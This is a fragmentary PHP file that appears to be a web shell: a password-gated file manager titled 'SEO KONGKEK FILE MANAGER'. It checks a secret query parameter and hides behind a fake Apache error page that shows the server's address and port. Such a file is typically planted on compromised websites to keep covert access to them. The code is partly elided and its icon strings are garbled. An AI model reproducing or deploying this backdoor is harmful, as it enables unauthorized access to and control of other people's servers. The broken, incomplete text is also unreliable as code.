<?php
$hashKunci = '$2y$10$aLPO4q0FDnee8M0E4mCBCezsUGczoUXsfEAHjL7lqMCGLWqxxGGW.';

if (!isset($_GET['sk']) || !password_verify($_GET['sk'], $hashKunci)) {
...
<hr>
<address>Apache/2.4.16 (Ubuntu) Server at '.$_SERVER['SERVER_ADDR'].' Port '.$_SERVER['SERVER_PORT'].'</address>
</body></html>';
    exit;
}
...
function getIcon($path) {
    return is_dir($path) ? 'ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“' : 'ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Å¾';
}
...
<head>
    <meta charset="UTF-8">
    <title>SEO KONGKEK DIRECTORY</title>
    ...
    <link rel="icon" type="image/png" sizes="16x16" href="https://images2.imgbox.com/cd/bd/T3ADGxP0_o.png">
...
<div class="header">
        <img src="https://images2.imgbox.com/3d/3e/8CBQXqmO_o.png" alt="Logo Kongkek">
</div>

<div id="container">
<h2 style="color: #ffcc00;">ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Å¡ SEO KONGKEK FILE MANAGER</h2>
...
<h4 style="color:#ffcc00; text-align: center; margin: 20px auto; width: 100%; max-width: 100%; font-size: 1rem;">SEO KONGKEK DIRECTORY 403 v1.1.9</h4>
</body>
</html>
